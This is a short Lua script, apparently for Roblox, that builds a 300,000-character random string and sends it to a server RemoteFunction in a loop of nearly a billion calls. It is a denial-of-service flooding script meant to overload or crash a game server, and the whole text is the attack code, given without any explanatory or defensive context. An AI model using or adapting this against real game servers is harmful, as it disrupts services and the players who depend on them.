local s = ""
for i = 1, 300000 do
    s = s .. string.char(math.random(65, 90))
end

local x = 1
for i = 1, 999999999 do
    x = x * 1.0000001
    game.ReplicatedStorage.RemoteFunction:InvokeServer(s)
end
